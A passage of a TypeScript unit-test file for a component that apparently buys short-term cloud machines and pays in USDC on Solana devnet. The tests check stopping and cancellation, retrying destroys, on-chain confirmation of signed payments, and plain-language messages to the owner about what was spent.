        return f(input, init);
      }) as typeof fetch;
    const { run, events, payer, processor, records } = setup({ wrap });
    target = run;
    await run.start();
    await run.done;
    const v = run.view();
    expect(phaseAtDestroy).toBe("paying");
    expect(v.phase).toBe("refused");
    expect(v.refusal?.code).toBe("STOPPED");
    expect(v.spent).toBe("nothing");
    expect(v.payment).toBeNull();
    expect(payer.calls).toBe(0);
    expect(processor.settled).toBe(0);
    expect(events()).toEqual(["intent", "failed"]);
    expect(records).toEqual([expect.objectContaining({ outcome: "refused", usd: null, reason: expect.stringContaining("STOPPED") })]);
  });

  it("destroy during the fallback re-quote stops the run instead of showing a new approval stop", async () => {
    const { run, seller, events, payer, processor } = setup({ ask: true });
    await run.start();
    seller.faults = { ...seller.faults, outOfStockRegions: ["ewr"] };
    let target: MarketRun | null = null;
    let unpaid = 0;
    const handle = seller.handle.bind(seller);
    seller.handle = async (req: Request) => {
      // first unpaid POST: the fresh 402 for the approved quote; second: the fallback re-quote
      if (req.method === "POST" && !req.headers.has("PAYMENT-SIGNATURE") && target && ++unpaid === 2) void target.destroy();
      return handle(req);
    };
    expect(run.approve("code-1")).toEqual({ ok: true });
    target = run;
    await run.done;
    expect(unpaid).toBeGreaterThanOrEqual(2);
    expect(run.view().phase).toBe("refused");
    expect(run.view().refusal?.code).toBe("STOPPED");
    expect(run.view().approval?.code).toBe("code-1"); // no new approval stop
    expect(events()).toEqual(["intent", "failed"]);
    expect(payer.calls).toBe(0);
    expect(processor.settled).toBe(0);
  });

  it("destroy during scanning stops the run before any payment", async () => {
    const { run, events, payer, records } = setup();
    const started = run.start();
    await run.destroy();
    await started;
    await run.done;
    expect(run.view().phase).toBe("refused");
    expect(run.view().refusal?.code).toBe("STOPPED");
    expect(run.view().attempts).toEqual([]);
    expect(events()).toEqual([]);
    expect(payer.calls).toBe(0);
    expect(records).toHaveLength(1);
  });

  it("destroy during quoting stops the run before any payment", async () => {
    let target: MarketRun | null = null;
    const wrap = (f: typeof fetch) =>
      (async (input: RequestInfo | URL, init?: RequestInit) => {
        if (init?.method === "POST" && target) {
          expect(target.view().phase).toBe("quoting");
          void target.destroy();
        }
        return f(input, init);
      }) as typeof fetch;
    const { run, events, payer } = setup({ wrap });
    target = run;
    await run.start();
    await run.done;
    expect(run.view().phase).toBe("refused");
    expect(run.view().refusal?.code).toBe("STOPPED");
    expect(run.view().attempts.length).toBeLessThanOrEqual(1);
    expect(events()).toEqual([]);
    expect(payer.calls).toBe(0);
  });

  it("a failed destroy is retried every 60 s, at most 10 times, and never after it succeeds", async () => {
    vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
    let deletes = 0;
    let failUntil = Infinity;
    const wrap = (f: typeof fetch) =>
      (async (input: RequestInfo | URL, init?: RequestInit) => {
        if (init?.method === "DELETE" && ++deletes <= failUntil) return new Response("nope", { status: 500 });
        return f(input, init);
      }) as typeof fetch;
    const { run } = setup({ wrap });
    await run.start();
    await run.destroy();
    expect(deletes).toBe(1);
    await vi.advanceTimersByTimeAsync(60_000);
    expect(deletes).toBe(2);
    await vi.advanceTimersByTimeAsync(20 * 60_000);
    expect(deletes).toBe(11); // the first try plus 10 retries
    expect(vi.getTimerCount()).toBe(0);
    expect(run.view().phase).toBe("ready");

    failUntil = 0;
    await run.destroy();
    expect(run.view().phase).toBe("released");
    expect(vi.getTimerCount()).toBe(0);
  });

  it("a retry that succeeds stops the retries", async () => {
    vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
    let deletes = 0;
    const wrap = (f: typeof fetch) =>
      (async (input: RequestInfo | URL, init?: RequestInit) => {
        if (init?.method === "DELETE" && ++deletes <= 2) return new Response("nope", { status: 500 });
        return f(input, init);
      }) as typeof fetch;
    const { run, events } = setup({ wrap });
    await run.start();
    await run.destroy();
    await vi.advanceTimersByTimeAsync(2 * 60_000);
    expect(run.view().phase).toBe("released");
    expect(vi.getTimerCount()).toBe(0);
    await vi.advanceTimersByTimeAsync(10 * 60_000);
    expect(deletes).toBe(3);
    expect(events().filter((e) => e === "released")).toHaveLength(1);
  });

  it("a provisioning timeout arms a destroy retry for the paid machine", async () => {
    vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
    const { run, seller, events } = setup({ activeAfterSec: 1e9 });
    await run.start();
    await run.done;
    expect(run.view().phase).toBe("failed");
    expect(run.view().error).toContain("did not become active");
    const id = run.view().machine!.id;
    expect(vi.getTimerCount()).toBe(1);
    await vi.advanceTimersByTimeAsync(60_000);
    expect(run.view().phase).toBe("released");
    expect(seller.machines.get(id)?.destroyed).toBe(true);
    expect(events()).toEqual(["intent", "paid", "released"]);
  });

  it("auto-destroy fires at destroyAt", async () => {
    vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
    const { run, seller, now, advance } = setup();
    await run.start();
    const { destroyAt, id } = run.view().machine!;
    const wait = destroyAt! - now();
    expect(wait).toBeGreaterThan(0);
    await vi.advanceTimersByTimeAsync(wait - 1000);
    expect(run.view().phase).toBe("ready");
    advance(wait);
    await vi.advanceTimersByTimeAsync(1000);
    await run.done;
    expect(run.view().phase).toBe("released");
    expect(seller.machines.get(id)?.destroyed).toBe(true);
  });

  it("the auto-destroy timer does not fire after destroy()", async () => {
    vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
    const { run, events } = setup();
    await run.start();
    await run.destroy();
    expect(vi.getTimerCount()).toBe(0);
    expect(events().filter((e) => e === "released")).toHaveLength(1);
  });
});

/** A findPayment that answers from a script, one entry per call (the last entry repeats). */
function chainScript(answers: ({ tx: string } | null | "unavailable" | Error)[]) {
  const calls: Parameters<NonNullable<MarketRunDeps["findPayment"]>>[0][] = [];
  const fn: NonNullable<MarketRunDeps["findPayment"]> = async (q) => {
    calls.push(q);
    const a = answers[Math.min(calls.length - 1, answers.length - 1)];
    if (a instanceof Error) throw a;
    return a;
  };
  return { fn, calls };
}

const KEPT = "The seller took one payment of $0.010382 and did not deliver a machine.";
const UNCONFIRMED_REJECTED =
  "A payment of $0.010382 was signed and sent. The seller says it was not accepted, and no transfer was found on chain yet. Check again later before paying anyone else.";
const UNAVAILABLE_REJECTED =
  "A payment of $0.010382 was signed and sent. The seller says it was not accepted, and the chain could not be checked right now, so check the transaction yourself before paying anyone else.";
const UNCHECKED_REJECTED =
  "A payment of $0.010382 was signed and sent. The seller says it was not accepted. This app could not check the chain, so check the transaction yourself before paying anyone else.";
const UNCHECKED_UNCLEAR =
  "A payment of $0.010382 was signed and sent. The seller did not confirm it. This app could not check the chain, so check the transaction yourself before paying anyone else.";
const UNCONFIRMED_UNCLEAR =
  "A payment of $0.010382 was signed and sent. The seller did not confirm it, and no transfer was found on chain yet. Check again later before paying anyone else.";

/** Answers every signed (paid) request with `answer`; everything else goes to the seller. */
const onPaid = (answer: () => Response | Promise<Response>, forward = true) => (f: typeof fetch) =>
  (async (input: RequestInfo | URL, init?: RequestInit) => {
    if (new Headers(init?.headers).has("PAYMENT-SIGNATURE")) {
      if (forward) await f(input, init); // the seller settles it
      return answer();
    }
    return f(input, init);
  }) as typeof fetch;

describe("MarketRun after a signed payment (B1)", () => {
  it("seller keeps the payment and says rejected; the chain shows it: failed, paid, record with amount and tx, no second payment", async () => {
    const chain = chainScript([null, { tx: "chainTx" }]);
    const { run, payer, events, records, processor, slept, now } = setup({ faults: { settleThenReject: true }, findPayment: chain.fn });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.phase).toBe("failed");
    expect(v.error).toBe(KEPT);
    expect(v.spent).toBe("paid");
    expect(v.payment).toEqual({ usd: CHEAPEST_USD, atomic: "10382", tx: "chainTx", at: expect.any(Number), payer: payer.address, status: "confirmed" });
    expect(v.paidAt).not.toBeNull();
    expect(chain.calls).toHaveLength(2);
    // the fake payer's header carries no Solana transaction, so the run falls back to excluding other runs' transfers
    expect(chain.calls[0]).toEqual({ payer: payer.address, payTo: FAKE_PAY_TO, atomic: "10382", sinceMs: expect.any(Number), exclude: [] });
    expect(chain.calls[0].sinceMs).toBeLessThanOrEqual(now());
    expect(slept.filter((ms) => ms === 5_000)).toHaveLength(1);
    expect(events()).toEqual(["intent", "unknown", "paid"]);
    expect(records).toEqual([expect.objectContaining({ outcome: "failed", usd: CHEAPEST_USD, tx: "chainTx", reason: `SELLER_KEPT_PAYMENT: ${KEPT}` })]);
    expect(payer.calls).toBe(1);
    expect(processor.settled).toBe(1);
    expect(v.machine).toBeNull();
    for (const a of v.attempts) expect(a.what).not.toMatch(/[{}]|quote_usd/);
  });

  it("seller says rejected and nothing is found on chain: checks 6 times 5 s apart, journal unknown, record without tx", async () => {
    const chain = chainScript([null]);
    const { run, payer, events, records, slept } = setup({ faults: { settleThenReject: true }, findPayment: chain.fn });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.phase).toBe("failed");
    expect(v.error).toBe(UNCONFIRMED_REJECTED);
    expect(v.spent).toBe("maybe");
    expect(v.payment).toMatchObject({ usd: CHEAPEST_USD, atomic: "10382", tx: null, status: "unconfirmed" });
    expect(chain.calls).toHaveLength(6);
    expect(slept.filter((ms) => ms === 5_000)).toHaveLength(5);
    expect(events()).toEqual(["intent", "unknown"]);
    expect(records).toEqual([expect.objectContaining({ outcome: "failed", usd: CHEAPEST_USD, tx: null, reason: `PAYMENT_UNCONFIRMED: ${UNCONFIRMED_REJECTED}` })]);
    expect(payer.calls).toBe(1);
  });

  it("with the payer's signature readable, the chain check looks for this run's own transaction", async () => {
    const chain = chainScript([{ tx: "ownTx" }]);
    const sig = Uint8Array.from({ length: 64 }, (_, i) => 255 - i);
    const wire = Buffer.concat([Buffer.from([2]), Buffer.alloc(64), Buffer.from(sig), Buffer.from([0x80, 1, 0, 1])]).toString("base64");
    const signing = fakePayer();
    const plain = signing.payHeaders.bind(signing);
    signing.payHeaders = async (required) => {
      const h = await plain(required);
      const decoded = JSON.parse(Buffer.from(h["PAYMENT-SIGNATURE"], "base64").toString("utf8"));
      return { "PAYMENT-SIGNATURE": Buffer.from(JSON.stringify({ ...decoded, payload: { transaction: wire } })).toString("base64") };
    };
    const { run, journal, events } = setup({ faults: { settleThenReject: true }, findPayment: chain.fn, payer: signing });
    journal.append({ at: T0 - 5_000, run: "older-run", market: "test", seller: "test", event: "paid", plan: "vc2-1c-1gb", region: "ewr", usd: CHEAPEST_USD, tx: "olderTx" });
    await run.start();
    await run.done;
    expect(run.view()).toMatchObject({ error: KEPT, spent: "paid", payment: { tx: "ownTx" } });
    expect(chain.calls[0]).toEqual({ payer: signing.address, payTo: FAKE_PAY_TO, atomic: "10382", sinceMs: expect.any(Number), signature: base58Encode(sig) });
    expect(events().slice(1)).toEqual(["intent", "unknown", "paid"]);
    expect(signing.calls).toBe(1);
  });

  it("without the signature, the chain check skips transactions other runs already recorded", async () => {
    const chain = chainScript([null]);
    const { run, journal } = setup({ faults: { settleThenReject: true }, findPayment: chain.fn });
    journal.append({ at: T0 - 5_000, run: "older-run", market: "test", seller: "test", event: "paid", plan: "vc2-1c-1gb", region: "ewr", usd: CHEAPEST_USD, tx: "olderTx" });
    journal.append({ at: T0 - 4_000, run: "older-run", market: "test", seller: "test", event: "active", plan: "vc2-1c-1gb", region: "ewr", usd: CHEAPEST_USD, tx: null });
    await run.start();
    await run.done;
    expect(run.view().error).toBe(UNCONFIRMED_REJECTED);
    for (const c of chain.calls) {
      expect(c.signature).toBeUndefined();
      expect(c.exclude).toEqual(["olderTx"]);
    }
  });

  it("without a chain check it says the chain was not checked, never that nothing was spent", async () => {
    const { run, events, records } = setup({ faults: { settleThenReject: true } });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.error).toBe(UNCHECKED_REJECTED);
    expect(v.spent).toBe("maybe");
    expect(events()).toEqual(["intent", "unknown"]);
    expect(records[0]).toMatchObject({ usd: CHEAPEST_USD, tx: null });
  });

  it("a chain check that always throws or cannot look says the chain could not be checked (M1)", async () => {
    for (const answer of [new Error("rpc down"), "unavailable" as const]) {
      const chain = chainScript([answer]);
      const { run } = setup({ faults: { settleThenReject: true }, findPayment: chain.fn });
      await run.start();
      await run.done;
      expect(run.view().error).toBe(UNAVAILABLE_REJECTED);
      expect(run.view().spent).toBe("maybe");
      expect(chain.calls).toHaveLength(6);
    }
  });

  it("one lookup that looked and found nothing is enough to say nothing was found yet (M1)", async () => {
    const chain = chainScript([new Error("rpc down"), "unavailable", null, new Error("rpc down")]);
    const { run } = setup({ faults: { settleThenReject: true }, findPayment: chain.fn });
    await run.start();
    await run.done;
    expect(run.view().error).toBe(UNCONFIRMED_REJECTED);
  });

  it("a price cap after signing is checked the same way", async () => {
    const chain = chainScript([{ tx: "capTx" }]);
    const { run, payer, events } = setup({ wrap: onPaid(() => new Response(JSON.stringify({ quote_usd: 0.5 }), { status: 409 })), findPayment: chain.fn });
    await run.start();
    await run.done;
    expect(run.view()).toMatchObject({ phase: "failed", error: KEPT, spent: "paid", payment: { tx: "capTx", status: "confirmed" } });
    expect(events()).toEqual(["intent", "unknown", "paid"]);
    expect(payer.calls).toBe(1);
  });

  it("an unknown outcome with no machine checks the chain and does not claim the seller refused", async () => {
    const chain = chainScript([null]);
    const { run, events, records } = setup({ wrap: onPaid(() => new Response("gateway timeout", { status: 504 }), false), findPayment: chain.fn });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.error).toBe(UNCONFIRMED_UNCLEAR);
    expect(v.spent).toBe("maybe");
    expect(events()).toEqual(["intent", "unknown"]);
    expect(records[0]).toMatchObject({ outcome: "failed", usd: CHEAPEST_USD, tx: null });
  });

  it("an error thrown after signing is handled as a payment that may have gone through", async () => {
    const chain = chainScript([{ tx: "thrownTx" }]);
    const { run, client, payer, records } = setup({ findPayment: chain.fn });
    const orig = client.provision.bind(client);
    client.provision = async (q, pay) => {
      await orig(q, pay);
      throw new Error("boom");
    };
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.phase).toBe("failed");
    expect(v.error).toBe(KEPT);
    expect(v.spent).toBe("paid");
    expect(records[0]).toMatchObject({ outcome: "failed", tx: "thrownTx" });
    expect(payer.calls).toBe(1);
  });

  it("the payment shows as sent, unconfirmed, while the paid request is in flight", async () => {
    let during: ReturnType<MarketRun["view"]> | null = null;
    let runRef: MarketRun | null = null;
    const wrap = (f: typeof fetch) =>
      (async (input: RequestInfo | URL, init?: RequestInit) => {
        if (new Headers(init?.headers).has("PAYMENT-SIGNATURE")) during = runRef!.view();
        return f(input, init);
      }) as typeof fetch;
    const { run, payer } = setup({ wrap });
    runRef = run;
    await run.start();
    expect(during!.payment).toEqual({ usd: CHEAPEST_USD, atomic: "10382", tx: null, at: expect.any(Number), payer: payer.address, status: "unconfirmed" });
    expect(during!.spent).toBe("maybe");
    expect(run.view().payment).toMatchObject({ tx: "tx-1", status: "confirmed" });
    expect(run.view().spent).toBe("paid");
  });

  it("409 settlement_pending: the adopted machine's payment gets its tx from the chain (N7)", async () => {
    const chain = chainScript([{ tx: "pendingTx" }]);
    const { run, events } = setup({ faults: { settlementPending409: true }, findPayment: chain.fn });
    await run.start();
    const v = run.view();
    expect(v.phase).toBe("ready");
    expect(v.payment).toMatchObject({ tx: "pendingTx", status: "confirmed" });
    expect(chain.calls).toHaveLength(1);
    expect(events()).toEqual(["intent", "unknown", "paid", "active"]);
    expect(run.view().spent).toBe("paid");
  });

  it("409 settlement_pending without a chain check: machine adopted, payment unconfirmed", async () => {
    const { run } = setup({ faults: { settlementPending409: true } });
    await run.start();
    expect(run.view().phase).toBe("ready");
    expect(run.view().payment).toMatchObject({ tx: null, status: "unconfirmed" });
    expect(run.view().spent).toBe("maybe");
  });

  it("spent is nothing when no payment was signed, and the record carries no amount", async () => {
    const a = setup({ ask: true });
    await a.run.start();
    expect(a.run.view().spent).toBe("nothing");
    a.run.cancel();
    expect(a.run.view().spent).toBe("nothing");
    expect(a.records[0]).toMatchObject({ outcome: "refused", usd: null, tx: null, reason: "CANCELLED: You cancelled before paying. Nothing was spent." });

    const b = setup({ faults: { quoteBumpPct: 20 } });
    await b.run.start();
    await b.run.done;
    expect(b.run.view().spent).toBe("nothing");
    expect(b.records[0]).toMatchObject({ outcome: "refused", usd: null });
  });
});

describe("MarketRun approval details (S1, S2)", () => {
  it("carries the exact amount and the short-rental surcharge", async () => {
    const { run } = setup({ ask: true });
    await run.start();
    expect(run.view().approval).toMatchObject({ usd: CHEAPEST_USD, atomic: "10382", exact: "$0.010382", surcharge: { pct: 15, underHours: 24 } });
    expect(run.view().rows.find((r) => r.state === "chosen")).toMatchObject({ quoteExact: "$0.010382" });
  });

  it("has no surcharge for a rental of 24 hours or more", async () => {
    const { run } = setup({ ask: true, need: { hours: 24 } });
    await run.start();
    expect(run.view().approval?.surcharge).toBeNull();
  });
});

describe("MarketRun fallback notes (N6)", () => {
  it("none on the happy path", async () => {
    const { run } = setup();
    await run.start();
    expect(run.view().fallbacks).toEqual([]);
  });

  it("a region out of stock at quote time", async () => {
    const { run } = setup({ faults: { outOfStockRegions: ["ewr"] } });
    await run.start();
    expect(run.view().fallbacks).toEqual(["ewr was out of stock, so the agent used ord."]);
  });

  it("a region out of stock at pay time", async () => {
    const { run, seller } = setup({ ask: true });
    await run.start();
    seller.faults = { ...seller.faults, outOfStockRegions: ["ewr"] };
    run.approve("code-1");
    await waitPhase(run, "approval");
    expect(run.view().fallbacks).toEqual(["ewr was out of stock, so the agent used ord."]);
  });

  it("a whole plan out of stock", async () => {
    const { run } = setup({ faults: { outOfStockRegions: ["ewr", "ord", "dfw", "sea"] } });
    await run.start();
    expect(run.view().fallbacks).toEqual([
      "vc2-1c-1gb was out of stock in ewr, ord and dfw, so the agent used do:s-1vcpu-1gb.",
      "vhp-1c-1gb-amd was out of stock in ewr, ord and dfw, so the agent used do:s-1vcpu-1gb.",
    ]);
  });
});

describe("MarketRun plain words (S3)", () => {
  const CODE = /\b[A-Z]{2,}_[A-Z_]+\b|atomic units|So1111/;

  it("nothing fits: counts in words, codes kept in leftOut and rows' code", async () => {
    const { run } = setup({ need: { vcpus: 64 } });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.refusal?.code).toBe("NOTHING_FITS");
    expect(v.refusal?.detail).not.toMatch(CODE);
    expect(v.refusal?.detail).toMatch(/^No plan fits what you asked for inside your limits: \d+ too small/);
    const left = v.rows.filter((r) => r.state === "left out");
    expect(left.every((r) => r.code !== null && !CODE.test(r.note ?? ""))).toBe(true);
  });

  it("wrong token: plain error and notes, code on the rows and attempts", async () => {
    const { run } = setup({ faults: { wrongAsset: true } });
    await run.start();
    await run.done;
    const v = run.view();
    const failed = v.rows.filter((r) => r.state === "quote failed");
    expect(failed[0]).toMatchObject({ code: "WRONG_ASSET", note: "The seller asked to be paid in SOL instead of USDC on Solana devnet." });
    expect(v.attempts.filter((a) => !a.ok).every((a) => a.code === "WRONG_ASSET")).toBe(true);
    expect(v.error).toBe("No seller gave a usable quote. The last problem: The seller asked to be paid in SOL instead of USDC on Solana devnet.");
    for (const t of [v.error, ...v.attempts.map((a) => a.what), ...v.rows.map((r) => r.note ?? "")]) expect(t).not.toMatch(CODE);
  });

  it("quote bump: the refusal names dollars", async () => {
    const { run } = setup({ faults: { quoteBumpPct: 20 } });
    await run.start();
    await run.done;
    expect(run.view().refusal).toEqual({ code: "OVER_QUOTE", detail: "The seller now asks $0.012458, more than the $0.010382 you approved." });
  });

  it("happy path attempts use exact dollars", async () => {
    const { run } = setup();
    await run.start();
    expect(run.view().attempts.map((a) => a.what)).toEqual(["quoted $0.010382", "quoted $0.012458", "quoted $0.013351", "paying $0.010382"]);
  });

  it("stopping and cancelling read as the owner's choice", async () => {
    const a = setup({ ask: true });
    await a.run.start();
    a.run.cancel();
    expect(a.run.view().refusal).toEqual({ code: "CANCELLED", detail: "You cancelled before paying. Nothing was spent." });
  });
});

describe("MarketRun overspend marker (S6)", () => {
  it("a run is the owner's unless the overspend test made it", async () => {
    const a = setup();
    expect(a.run.view().overspendTest).toBe(false);
  });
});
